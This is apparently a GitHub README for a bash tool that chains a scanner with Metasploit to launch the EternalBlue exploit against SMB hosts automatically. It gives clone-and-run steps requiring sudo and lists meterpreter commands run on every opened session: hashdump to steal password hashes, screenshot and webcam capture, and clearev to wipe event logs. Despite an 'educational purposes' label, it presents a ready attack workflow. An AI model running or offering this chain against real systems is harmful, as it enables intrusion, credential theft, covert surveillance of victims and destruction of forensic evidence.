[![forthebadge](https://forthebadge.com/images/badges/built-with-love.svg)](https://forthebadge.com)

## Table of content
- [About](#about) 
- [Requirements](#requirements)
- [Usage](#usage)
- [License](#license)
- [Contact Me](#contact-me)
- [Donate Me](#donate-me)

## About
The **eternalscanner** repo is made for educational purposes only. It uses `eternal_scanner` tool from [*Eternal_Scanner*](https://github.com/peterpt/eternal_scanner) repo and parses the output from it to `Metasploit` to make the eternalblue exploit somehow *autonomously*.

## Requirements
- The **SUDO** power
- Requirements for [*Eternal_Scanner*](https://github.com/peterpt/eternal_scanner) Tool 
    - netcat
    - masscan
    - metasploit-framework
    - wget (To Update Eternal Scanner Directly from github)
    - pip (for alternative install of python modules)
    - python-crypto (Dependency for Eternal Romance check)
    - python-impacket (Dependency for Eternal Romance check)
    - python-pyasn1-modules (Dependency for Eternal Romance check)

## Usage
[![forthebadge](https://forthebadge.com/images/badges/oooo-kill-em.svg)](https://forthebadge.com)
- `git clone git@github.com:nsa/eternalblue-scanner.git && cd eternalblue-scanner`
- `chmod +x eternalbash`
- `sudo bash eternalbash`

If any sessions were opened this scripts automatically runs the following **meterpreter** commands from the *`assets/nsa.rc`* file. If you don't want to use following commands, you can just simply change the commands from that **`nsa.rc`** file.

```
hashdump
screenshot
webcan_snap -v false
clearev
background
```

## Acknowledgement

* Thank [**peterpt**](https://github.com/peterpt/) for the *Eternal_Scanner* [[MIT License]](https://github.com/peterpt/eternal_scanner/blob/master/LICENSE) tool.


## License
```
MIT License

Copyright (c) 2018 Mustafa Çalap

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

### Contact Me
If you have any questions about this repo, you may create an issue or just hit me that questions on twitter. <br>
Author: **Mustafa ÇALAP** <br>
Website: [**calap.co**](https://calap.co) <br>
Twitter: [**mustafacalap**](https://twitter.com/mustafacalap)

### Donate Me
[![forthebadge](https://forthebadge.com/images/badges/fuck-it-ship-it.svg)](https://forthebadge.com)
- Bitcoin : 1MUSTkECBR1yr6Jbd5QjT9EXJXGgDaZieJ <br />
<img src="https://rlv.zcache.com/bitcoin_accepted_here_sticker-r148616b487084a369d4c15bf39055043_v9i40_8byvr_324.jpg" width="200px" height="200px">[![BTC Wallet](https://calap.co/images/BTC-wallet.png)](https://calap.co/blog/support-me/)
